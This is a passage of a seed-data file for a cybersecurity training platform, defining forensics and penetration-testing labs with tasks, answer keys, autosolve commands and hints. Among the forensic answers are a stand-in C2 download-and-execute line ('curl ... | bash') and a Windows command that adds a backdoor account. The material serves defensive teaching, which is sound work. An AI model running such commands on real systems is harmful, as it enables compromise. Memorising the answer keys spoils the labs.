                        "instructions": "Which command extracts Egyptian mobile numbers from evidence.txt?",
                        "expected_answer": "grep -Eo '01[0125][0-9]{8}' evidence.txt",
                        "autosolve_commands": [],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Use grep -Eo for regex extraction", "order": 1, "delay": 0},
                            {"text": "Egyptian numbers start with 010, 011, 012, or 015 using 01[0125]", "order": 2, "delay": 0},
                            {"text": "Followed by 8 digits using [0-9]{8}", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 5 - Evidence: Primary Suspect Email",
                        "instructions": "Go to ~/labs/regex. What is the primary suspect email? (The first email extracted from evidence.txt)",
                        "expected_answer": "john.smith@acmecorp.com",
                        "autosolve_commands": ["cd ~/labs/regex && grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}' evidence.txt | head -n 1"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "First navigate to the correct directory using cd ~/labs/regex", "order": 1, "delay": 0},
                            {"text": "Extract emails using grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}' evidence.txt", "order": 2, "delay": 0},
                            {"text": "Get the first result using | head -n 1", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 6 - Evidence: Malware C2 IP",
                        "instructions": "What IP address is labeled as the Malware C2 server?",
                        "expected_answer": "203.0.113.45",
                        "autosolve_commands": ["cd ~/labs/regex && grep 'Malware C2 server' evidence.txt | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'"],
                        "sort_order": 5,
                        "hints": [
                            {"text": "Search the line using grep \"Malware C2 server\" evidence.txt", "order": 1, "delay": 0},
                            {"text": "Extract the IP using grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'", "order": 2, "delay": 0},
                            {"text": "Combine both to isolate the IP address", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 7 - Evidence: Exfiltration URL",
                        "instructions": "What URL is used for the data exfiltration attempt?",
                        "expected_answer": "https://evil-c2.darkweb.io/upload",
                        "autosolve_commands": ["grep 'exfiltration' ~/labs/regex/evidence.txt | grep -Eo 'https?://[^ ]+'"],
                        "sort_order": 6,
                        "hints": [
                            {"text": "Extract URLs using grep -Eo 'https?://[^ ]+' evidence.txt", "order": 1, "delay": 0},
                            {"text": "Look for the line mentioning data exfiltration attempt", "order": 2, "delay": 0},
                            {"text": "Identify the full URL from the output", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 8 - Evidence: Burner Phone",
                        "instructions": "What burner phone number is listed in evidence.txt?",
                        "expected_answer": "01523456789",
                        "autosolve_commands": ["grep -i 'Burner phone' ~/labs/regex/evidence.txt | grep -Eo '01[0125][0-9]{8}'"],
                        "sort_order": 7,
                        "hints": [
                            {"text": "Navigate to ~/labs/regex first using cd ~/labs/regex", "order": 1, "delay": 0},
                            {"text": "Extract Egyptian numbers using grep -Eo '01[0125][0-9]{8}' evidence.txt", "order": 2, "delay": 0},
                            {"text": "The output is the answer", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 9 - Evidence: USB WiFi Adapter MAC",
                        "instructions": "What MAC address belongs to the USB WiFi adapter?",
                        "expected_answer": "DE:AD:BE:EF:CA:FE",
                        "autosolve_commands": ["cd ~/labs/regex && grep -i 'USB WiFi adapter' evidence.txt | grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}'"],
                        "sort_order": 8,
                        "hints": [
                            {"text": "Navigate to ~/labs/regex first using cd ~/labs/regex", "order": 1, "delay": 0},
                            {"text": "Extract MAC addresses using grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' evidence.txt", "order": 2, "delay": 0},
                            {"text": "The output is the answer", "order": 3, "delay": 0},
                        ],
                    },
                ],
            },

            # ── Lab 4 — Memory Forensics Basics ────────────────────────────────────
            {
                "title": "Memory Forensics Basics",
                "description": "Analyze a memory image to uncover running processes, network connections, backdoor commands, registry persistence, and passwords.",
                "difficulty": "intermediate",
                "has_auto_solve": True,
                "max_duration_minutes": None,
                "sort_order": 4,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "df-kali", "terminal_type": "df-kali"},
                "tasks": [
                    {
                        "title": "Task 1 - Command: Memory Image Information",
                        "instructions": "Which command is used to identify operating system information from memory.raw?",
                        "expected_answer": "volatility -f memory.raw imageinfo",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Start with volatility -f memory.raw", "order": 1, "delay": 0},
                            {"text": "Use the plugin that identifies memory profile information", "order": 2, "delay": 0},
                            {"text": "The plugin name is imageinfo", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 2 - Command: List Processes",
                        "instructions": "Which command displays running processes from memory.raw?",
                        "expected_answer": "volatility -f memory.raw pslist",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Start with volatility -f memory.raw", "order": 1, "delay": 0},
                            {"text": "Use the plugin that lists running processes", "order": 2, "delay": 0},
                            {"text": "The plugin name is pslist", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 3 - Command: Process Tree",
                        "instructions": "Which command shows parent-child process relationships from memory.raw?",
                        "expected_answer": "volatility -f memory.raw pstree",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Start with volatility -f memory.raw", "order": 1, "delay": 0},
                            {"text": "Use the plugin that displays process hierarchy", "order": 2, "delay": 0},
                            {"text": "The plugin name is pstree", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 4 - Command: Network Connections",
                        "instructions": "Which command displays network connections from memory.raw?",
                        "expected_answer": "volatility -f memory.raw netscan",
                        "autosolve_commands": [],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Start with volatility -f memory.raw", "order": 1, "delay": 0},
                            {"text": "Use the plugin that scans network connections", "order": 2, "delay": 0},
                            {"text": "The plugin name is netscan", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 5 - Evidence: Suspicious PowerShell PID",
                        "instructions": "Go to ~/labs/memory. What PID is shown for powershell.exe in memory.raw?",
                        "expected_answer": "2048",
                        "autosolve_commands": ["strings ~/labs/memory/memory.raw | grep -i 'powershell.exe' | grep -Eo 'PID:[0-9]+' | grep -Eo '[0-9]+'"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "Navigate using cd ~/labs/memory", "order": 1, "delay": 0},
                            {"text": "Extract readable strings using strings memory.raw", "order": 2, "delay": 0},
                            {"text": "Search for PowerShell using grep -i powershell", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 6 - Evidence: External HTTPS Connection",
                        "instructions": "Which external IP is connected on port 443?",
                        "expected_answer": "45.33.32.156",
                        "autosolve_commands": ["strings ~/labs/memory/memory.raw | grep 'NETWORK:' | grep ':443 ESTABLISHED' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' | tail -1"],
                        "sort_order": 5,
                        "hints": [
                            {"text": "Extract readable strings using strings memory.raw", "order": 1, "delay": 0},
                            {"text": "Search for network activity using grep NETWORK", "order": 2, "delay": 0},
                            {"text": "Look for a connection ending with :443 ESTABLISHED", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 7 - Evidence: Backdoor Command",
                        "instructions": "Which command creates a backdoor user?",
                        "expected_answer": "cmd.exe /c net user backdoor P@ssw0rd /add",
                        "autosolve_commands": ["strings ~/labs/memory/memory.raw | grep 'CMD:' | grep 'net user' | sed 's/^CMD: //'"],
                        "sort_order": 6,
                        "hints": [
                            {"text": "Extract readable strings using strings memory.raw", "order": 1, "delay": 0},
                            {"text": "Search for Windows account commands using grep -i 'net user'", "order": 2, "delay": 0},
                            {"text": "Read the full suspicious command line", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 8 - Evidence: Registry Persistence",
                        "instructions": "Which Run-key executable path is shown in memory.raw?",
                        "expected_answer": "C:\\Users\\student\\AppData\\malware.exe",
                        "autosolve_commands": ["strings ~/labs/memory/memory.raw | grep 'REG:' | grep -o 'C:\\\\.*\\.exe'"],
                        "sort_order": 7,
                        "hints": [
                            {"text": "Extract readable strings using strings memory.raw", "order": 1, "delay": 0},
                            {"text": "Search for registry Run keys using grep -i 'CurrentVersion\\Run'", "order": 2, "delay": 0},
                            {"text": "Look for the executable path linked to persistence", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 9 - Evidence: Password String",
                        "instructions": "Which password value is found in memory.raw?",
                        "expected_answer": "admin123",
                        "autosolve_commands": ["strings ~/labs/memory/memory.raw | grep 'STR:' | grep 'password=' | head -1 | grep -Eo 'password=[^ ]*' | cut -d= -f2"],
                        "sort_order": 8,
                        "hints": [
                            {"text": "Extract readable strings using strings memory.raw", "order": 1, "delay": 0},
                            {"text": "Search for password values using grep -i password", "order": 2, "delay": 0},
                            {"text": "Look for the value after password=", "order": 3, "delay": 0},
                        ],
                    },
                ],
            },

            # ── Lab 5 — Deleted File Recovery with Sleuth Kit ──────────────────────
            {
                "title": "Deleted File Recovery with Sleuth Kit",
                "description": "Use fls, istat, and icat from The Sleuth Kit to find deleted files, inspect inode metadata, and recover deleted evidence.",
                "difficulty": "intermediate",
                "has_auto_solve": True,
                "max_duration_minutes": None,
                "sort_order": 5,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "df-kali", "terminal_type": "df-kali"},
                "tasks": [
                    {
                        "title": "Task 1 - Command: Partition Layout",
                        "instructions": "Which command displays partition information from evidence.dd?",
                        "expected_answer": "mmls evidence.dd",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Use the Sleuth Kit partition analysis tool mmls", "order": 1, "delay": 0},
                            {"text": "Add the disk image name evidence.dd", "order": 2, "delay": 0},
                            {"text": "The command displays volume and partition layout information", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 2 - Command: File System Information",
                        "instructions": "Which command displays file system statistics and metadata from evidence.dd?",
                        "expected_answer": "fsstat evidence.dd",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use the Sleuth Kit file system statistics tool fsstat", "order": 1, "delay": 0},
                            {"text": "Add the disk image name evidence.dd", "order": 2, "delay": 0},
                            {"text": "The command shows file system type, block size, and layout details", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 3 - Command: Deleted Files Only",
                        "instructions": "Which command displays deleted files only from evidence.dd?",
                        "expected_answer": "fls -rd evidence.dd",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Use the file listing tool fls", "order": 1, "delay": 0},
                            {"text": "Add the deleted-files flag -d", "order": 2, "delay": 0},
                            {"text": "Combine it with recursive listing using -r", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 4 - Command: Inode Metadata",
                        "instructions": "Which command displays metadata for inode 18 in evidence.dd?",
                        "expected_answer": "istat evidence.dd 18",
                        "autosolve_commands": [],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Use the inode statistics tool istat", "order": 1, "delay": 0},
                            {"text": "Add the image name evidence.dd", "order": 2, "delay": 0},
                            {"text": "Specify inode number 18 at the end of the command", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 5 - Evidence: Deleted File Name",
                        "instructions": "Go to ~/labs/diskimage. Which deleted file is shown by fls -rd evidence.dd?",
                        "expected_answer": "evidence.txt",
                        "autosolve_commands": ["fls -rd ~/labs/diskimage/evidence.dd | awk '{print $NF}'"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "Navigate using cd ~/labs/diskimage", "order": 1, "delay": 0},
                            {"text": "List deleted files recursively using fls -rd evidence.dd", "order": 2, "delay": 0},
                            {"text": "Read the deleted filename from the output", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 6 - Evidence: Deleted File Inode",
                        "instructions": "What inode number is shown for the deleted evidence.txt file?",
                        "expected_answer": "18",
                        "autosolve_commands": ["fls -rd ~/labs/diskimage/evidence.dd | awk '{gsub(\":\",\"\",$3); print $3}'"],
                        "sort_order": 5,
                        "hints": [
                            {"text": "Run fls -rd evidence.dd", "order": 1, "delay": 0},
                            {"text": "Look at the number displayed before the filename", "order": 2, "delay": 0},
                            {"text": "Identify the inode associated with evidence.txt", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 7 - Evidence: Allocation Status",
                        "instructions": "According to istat evidence.dd 18, is the inode allocated or not allocated?",
                        "expected_answer": "Not Allocated",
                        "autosolve_commands": ["istat ~/labs/diskimage/evidence.dd 18 | grep -i 'Allocated'"],
                        "sort_order": 6,
                        "hints": [
                            {"text": "Display inode metadata using istat evidence.dd 18", "order": 1, "delay": 0},
                            {"text": "Look near the top of the output for allocation details", "order": 2, "delay": 0},
                            {"text": "Read the inode status value", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 8 - Evidence: Recover Deleted File",
                        "instructions": "Recover the deleted file using icat evidence.dd 18 > recovered.txt. What case number is found inside?",
                        "expected_answer": "2024-1547",
                        "autosolve_commands": ["icat ~/labs/diskimage/evidence.dd 18 | grep 'CASE #' | grep -Eo '[0-9]+-[0-9]+'"],
                        "sort_order": 7,
                        "hints": [
                            {"text": "Recover the file using icat evidence.dd 18 > recovered.txt", "order": 1, "delay": 0},
                            {"text": "Read the recovered file using cat recovered.txt", "order": 2, "delay": 0},
                            {"text": "Look for the CASE # value near the top", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 9 - Evidence: Offshore Account",
                        "instructions": "What offshore account number is found in the recovered file?",
                        "expected_answer": "CH-9300762011623852957",
                        "autosolve_commands": ["icat ~/labs/diskimage/evidence.dd 18 | grep -Eo 'CH-[0-9]+'"],
                        "sort_order": 8,
                        "hints": [
                            {"text": "Read the recovered file using cat recovered.txt", "order": 1, "delay": 0},
                            {"text": "Look for the line starting with Transferred", "order": 2, "delay": 0},
                            {"text": "Answer with the account number after the colon", "order": 3, "delay": 0},
                        ],
                    },
                ],
            },

            # ── Lab 6 — Steganography and Metadata Analysis ────────────────────────
            {
                "title": "Steganography and Metadata Analysis",
                "description": "Use steghide and exiftool to uncover hidden data embedded in image files and detect disguised file types through metadata inspection.",
                "difficulty": "advanced",
                "has_auto_solve": True,
                "max_duration_minutes": None,
                "sort_order": 6,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "df-kali", "terminal_type": "df-kali"},
                "tasks": [
                    {
                        "title": "Task 1 - Command: Check for Hidden Data",
                        "instructions": "Which command checks if company_logo.bmp contains hidden embedded data?",
                        "expected_answer": "steghide info company_logo.bmp",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Use steghide with the info flag", "order": 1, "delay": 0},
                            {"text": "Specify the image file directly after the info flag (no -sf)", "order": 2, "delay": 0},
                            {"text": "The command reveals capacity and the embedded filename", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 2 - Command: Extract Hidden Data",
                        "instructions": "Which command extracts hidden data from company_logo.bmp using the passphrase forensics?",
                        "expected_answer": 'steghide extract -sf company_logo.bmp -p "forensics"',
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use steghide with the extract flag", "order": 1, "delay": 0},
                            {"text": "Use -sf for the image file and -p \"forensics\" for the passphrase", "order": 2, "delay": 0},
                            {"text": "The command writes the embedded file to the current directory", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 3 - Command: Read EXIF Metadata",
                        "instructions": "Which command reads all EXIF metadata from company_logo.jpg?",
                        "expected_answer": "exiftool company_logo.jpg",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Use the exiftool metadata reader", "order": 1, "delay": 0},
                            {"text": "Apply it directly to company_logo.jpg", "order": 2, "delay": 0},
                            {"text": "The command shows timestamps, software, and image properties", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 4 - Command: Extract File Type Metadata",
                        "instructions": "Which command extracts only the FileType metadata field from financial_report.docx?",
                        "expected_answer": "exiftool -FileType financial_report.docx",
                        "autosolve_commands": [],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Use exiftool with a specific field flag", "order": 1, "delay": 0},
                            {"text": "Use -FileType to request only the file type field", "order": 2, "delay": 0},
                            {"text": "Apply it to financial_report.docx", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 5 - Evidence: Embedded Filename",
                        "instructions": "Go to ~/labs/insider. Run steghide info company_logo.bmp. What is the embedded filename?",
                        "expected_answer": "hidden_evidence.txt",
                        "autosolve_commands": ["steghide info -p 'forensics' ~/labs/insider/company_logo.bmp 2>&1 | grep 'embedded file' | awk -F'\"' '{print $2}'"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "Navigate using cd ~/labs/insider", "order": 1, "delay": 0},
                            {"text": "Run steghide info company_logo.bmp", "order": 2, "delay": 0},
                            {"text": "Look for the embedded file name in the output", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 6 - Evidence: USB Serial Number",
                        "instructions": "Extract the hidden data from company_logo.bmp. What USB serial number is mentioned?",
                        "expected_answer": "USB-202401-INSIDER",
                        "autosolve_commands": ["steghide extract -sf ~/labs/insider/company_logo.bmp -p 'forensics' -f -q && grep -Eo 'USB-[A-Z0-9-]+' ~/labs/insider/hidden_evidence.txt"],
                        "sort_order": 5,
                        "hints": [
                            {"text": "Extract with steghide extract -sf company_logo.bmp -p \"forensics\"", "order": 1, "delay": 0},
                            {"text": "Read the extracted file using cat hidden_evidence.txt", "order": 2, "delay": 0},
                            {"text": "Look for the Destination USB serial line", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 7 - Evidence: Contact Email",
                        "instructions": "What contact email is listed in the hidden evidence file?",
                        "expected_answer": "personal_email@gmail.com",
                        "autosolve_commands": ["grep -o '[a-zA-Z0-9._%+-]*@[a-zA-Z0-9.-]*\\.[a-zA-Z]*' ~/labs/insider/hidden_evidence.txt"],
                        "sort_order": 6,
                        "hints": [
                            {"text": "Read the extracted file using cat hidden_evidence.txt", "order": 1, "delay": 0},
                            {"text": "Look for the Contact email used line", "order": 2, "delay": 0},
                            {"text": "Answer with the full email address", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 8 - Evidence: Files Copied to USB",
                        "instructions": "How many confidential files were copied to USB according to the hidden data?",
                        "expected_answer": "47",
                        "autosolve_commands": ["grep -i 'copied' ~/labs/insider/hidden_evidence.txt | grep -Eo '[0-9]+' | head -1"],
                        "sort_order": 7,
                        "hints": [
                            {"text": "Read the extracted file using cat hidden_evidence.txt", "order": 1, "delay": 0},
                            {"text": "Look for the line starting with Employee copied", "order": 2, "delay": 0},
                            {"text": "Answer with the number of files", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 9 - Evidence: Disguised File Type",
                        "instructions": "Run exiftool -FileType financial_report.docx. What file type does it report?",
                        "expected_answer": "ZIP",
                        "autosolve_commands": ["exiftool -FileType ~/labs/insider/financial_report.docx | awk '{print $NF}'"],
                        "sort_order": 8,
                        "hints": [
                            {"text": "Run exiftool -FileType financial_report.docx", "order": 1, "delay": 0},
                            {"text": "The extension says .docx but exiftool reads the real format", "order": 2, "delay": 0},
                            {"text": "Answer with the file type value shown", "order": 3, "delay": 0},
                        ],
                    },
                ],
            },

            # ── Lab 7 — Malware Persistence Analysis ───────────────────────────────
            {
                "title": "Malware Persistence Analysis",
                "description": "Investigate malware persistence mechanisms: malicious cron jobs, Base64-encoded payloads, backdoor accounts, and suspicious SSH logins.",
                "difficulty": "advanced",
                "has_auto_solve": True,
                "max_duration_minutes": None,
                "sort_order": 7,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "df-kali", "terminal_type": "df-kali"},
                "tasks": [
                    {
                        "title": "Task 1 - Command: List Cron Jobs",
                        "instructions": "Which command lists the current user's scheduled cron jobs?",
                        "expected_answer": "crontab -l",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Use the Linux scheduled-task utility crontab", "order": 1, "delay": 0},
                            {"text": "Add the list flag -l", "order": 2, "delay": 0},
                            {"text": "The command displays scheduled cron entries for the current user", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 2 - Command: Decode Base64 File",
                        "instructions": "Which command decodes the Base64-encoded file encoded_payload.txt?",
                        "expected_answer": "base64 -d encoded_payload.txt",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use the Linux decoding utility base64", "order": 1, "delay": 0},
                            {"text": "Add the decode flag -d", "order": 2, "delay": 0},
                            {"text": "Apply the command to encoded_payload.txt", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 3 - Command: Find Shell Users",
                        "instructions": "Which command lists users in /etc/passwd that have a real shell (not nologin)?",
                        "expected_answer": "cat /etc/passwd | grep -v nologin",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Display the passwd file using cat /etc/passwd", "order": 1, "delay": 0},
                            {"text": "Pipe the output into grep -v nologin", "order": 2, "delay": 0},
                            {"text": "The command excludes accounts without shell access", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 4 - Command: Find Successful SSH Logins",
                        "instructions": "Which command finds successful SSH login lines in auth.log?",
                        "expected_answer": "grep \"Accepted\" auth.log",
                        "autosolve_commands": [],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Use the Linux text-search utility grep", "order": 1, "delay": 0},
                            {"text": "Search for the keyword Accepted", "order": 2, "delay": 0},
                            {"text": "Apply the search to auth.log", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 5 - Evidence: Cron Backdoor Script",
                        "instructions": "Go to ~/labs/malware. What script path is scheduled in the malicious cron job?",
                        "expected_answer": "/tmp/.x/beacon.sh",
                        "autosolve_commands": ["crontab -l | grep -Eo '/[^ ]+'"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "Navigate using cd ~/labs/malware", "order": 1, "delay": 0},
                            {"text": "List cron jobs using crontab -l", "order": 2, "delay": 0},
                            {"text": "Read the suspicious script path from the cron entry", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 6 - Evidence: Decoded Payload Command",
                        "instructions": "Decode encoded_payload.txt. What full shell command does it contain?",
                        "expected_answer": "curl http://evil-c2.io/stage2.sh | bash",
                        "autosolve_commands": ["cd ~/labs/malware && base64 -d encoded_payload.txt"],
                        "sort_order": 5,
                        "hints": [
                            {"text": "Decode the file using base64 -d encoded_payload.txt", "order": 1, "delay": 0},
                            {"text": "The decoded content is a single shell command", "order": 2, "delay": 0},
                            {"text": "Read the full output line carefully", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 7 - Evidence: Backdoor Username",
                        "instructions": "Which suspicious username exists in /etc/passwd with shell access?",
                        "expected_answer": "sysbackup",
                        "autosolve_commands": ["grep '/bin/bash$' /etc/passwd | grep -v root | grep -v student | cut -d: -f1"],
                        "sort_order": 6,
                        "hints": [
                            {"text": "Display shell-enabled accounts using cat /etc/passwd | grep -v nologin", "order": 1, "delay": 0},
                            {"text": "Exclude disabled shells using grep -v false", "order": 2, "delay": 0},
                            {"text": "Identify the unusual non-system username in the output", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 8 - Evidence: Attacker IP Address",
                        "instructions": "What external IP address had a successful SSH login in auth.log?",
                        "expected_answer": "185.220.101.45",
                        "autosolve_commands": ["grep 'Accepted' ~/labs/malware/auth.log | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'"],
                        "sort_order": 7,
                        "hints": [
                            {"text": "Search successful logins using grep \"Accepted\" auth.log", "order": 1, "delay": 0},
                            {"text": "Look for the remote IP address in the log entry", "order": 2, "delay": 0},
                            {"text": "Identify the external IP associated with the login", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 9 - Evidence: Login Username",
                        "instructions": "What username did the attacker use to log in via SSH?",
                        "expected_answer": "root",
                        "autosolve_commands": ["grep 'Accepted' ~/labs/malware/auth.log | awk '{for(i=1;i<=NF;i++) if($i==\"for\") {print $(i+1); exit}}'"],
                        "sort_order": 8,
                        "hints": [
                            {"text": "Search successful SSH logins using grep \"Accepted\" auth.log", "order": 1, "delay": 0},
                            {"text": "Look for the username in the matching log line", "order": 2, "delay": 0},
                            {"text": "The username appears after the word \"for\" in the log entry", "order": 3, "delay": 0},
                        ],
                    },
                ],
            },
        ],
    },

    # =====================================================================
    # 5. Metasploit & Metasploitable Penetration Testing
    # =====================================================================
    {
        "title": "Metasploit & Metasploitable Penetration Testing",
        "description": "Learn penetration testing fundamentals using the Metasploit Framework against the intentionally vulnerable Metasploitable2 target. Covers network reconnaissance with Nmap, service enumeration, vulnerability identification, and exploitation using real Metasploit modules — all inside a safe, isolated Docker lab environment.",
        "difficulty_level": "intermediate",
        "category": "Penetration Testing",
        "estimated_hours": 8.0,
        "is_published": True,
        "labs": [
            {
                "title": "Penetration Testing Concepts",
                "description": "Before touching any tools, understand the fundamentals: CVE, CVSS, penetration testing methodology, and the Metasploit command structure. No live machine required — theory only.",
                "difficulty": "beginner",
                "has_auto_solve": False,
                "max_duration_minutes": 120,
                "sort_order": 1,
                "is_published": True,
                "docker_compose_config": {},
                "tasks": [
                    {
                        "title": "What does CVE stand for?",
                        "instructions": "**Common Vulnerabilities and Exposures (CVE)** is the global standard for identifying and naming publicly known cybersecurity vulnerabilities.\n\nEach CVE entry has a unique ID in the format **CVE-YEAR-NUMBER** (e.g., `CVE-2021-44228` is the famous Log4Shell vulnerability). The list is maintained by **MITRE Corporation** and is used by security tools, vulnerability scanners, and patch management systems worldwide.\n\nWhen a researcher discovers a vulnerability, they request a CVE ID so the community can track it consistently — the same vulnerability gets the same name regardless of which vendor or tool refers to it.\n\n> **Famous examples:** CVE-2017-0144 (EternalBlue / WannaCry), CVE-2021-44228 (Log4Shell), CVE-2014-0160 (Heartbleed)\n\nWhat does the acronym **CVE** stand for?",
                        "expected_answer": "Common Vulnerabilities and Exposures",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "CVE is maintained by MITRE Corporation.", "order": 1, "delay": 0},
                            {"text": "Three words: Common, Vulnerabilities, and Exposures.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What is the first phase of a penetration test?",
                        "instructions": "A penetration test follows a structured methodology with distinct phases. Understanding the order matters — skipping phases leads to missed vulnerabilities or noisy attacks that get detected.\n\n**The five phases of a penetration test:**\n\n1. **Reconnaissance** — Gather information about the target (passive and active)\n2. **Scanning & Enumeration** — Discover open ports, services, and versions\n3. **Exploitation** — Leverage vulnerabilities to gain access\n4. **Post-Exploitation** — Escalate privileges, pivot, maintain persistence\n5. **Reporting** — Document findings and remediation steps\n\nThe very first phase is passive — you collect publicly available information without directly touching the target. This includes WHOIS lookups, DNS enumeration, LinkedIn profiling, and more.\n\nWhat is the **first phase** of a penetration test?",
                        "expected_answer": "reconnaissance",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "This phase is also called 'information gathering' or 'footprinting'.", "order": 1, "delay": 0},
                            {"text": "The term starts with the letter R.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What is the default port for MySQL?",
                        "instructions": "Every network service listens on a **port number** — a 16-bit number (0–65535) that identifies which service should handle incoming traffic. Knowing default ports is essential for both attackers and defenders.\n\n**Common default ports you must know:**\n\n| Port | Service |\n|------|---------|\n| 21   | FTP     |\n| 22   | SSH     |\n| 80   | HTTP    |\n| 443  | HTTPS   |\n| 3306 | ?       |\n| 5432 | PostgreSQL |\n| 27017 | MongoDB |\n\nMetasploitable2 exposes many of these. During our Nmap lab you will see them all.\n\nWhat is the **default TCP port** for MySQL?",
                        "expected_answer": "3306",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "The port number is between 3000 and 4000.", "order": 1, "delay": 0},
                        ],
                    },
                    {
                        "title": "What Metasploit command searches for modules?",
                        "instructions": "**Metasploit Framework** is the world's most widely used penetration testing platform. Its interactive console, `msfconsole`, gives you access to thousands of exploits, payloads, auxiliary scanners, and post-exploitation modules.\n\n**The basic Metasploit workflow:**\n\n```\nmsfconsole          # start the console\nsearch <keyword>    # find modules\nuse <module_path>   # select a module\ninfo                # read module details\nset RHOSTS <ip>     # configure the target\nset LHOST <ip>      # configure your listener\nrun                 # launch the exploit\n```\n\nBefore you can exploit anything you need to find the right module. Metasploit has over 2,000 exploits — the `search` command filters them by keyword, CVE ID, or platform.\n\n**Example:** `search unreal_ircd` will find the UnrealIRCd backdoor exploit we will use later in this course.\n\nWhat single-word msfconsole command do you use to **search for modules**?",
                        "expected_answer": "search",
                        "autosolve_commands": [],
                        "sort_order": 3,
                        "hints": [
                            {"text": "It's the same word you type into Google every day.", "order": 1, "delay": 0},
                        ],
                    },
                    {
                        "title": "What does CVSS stand for?",
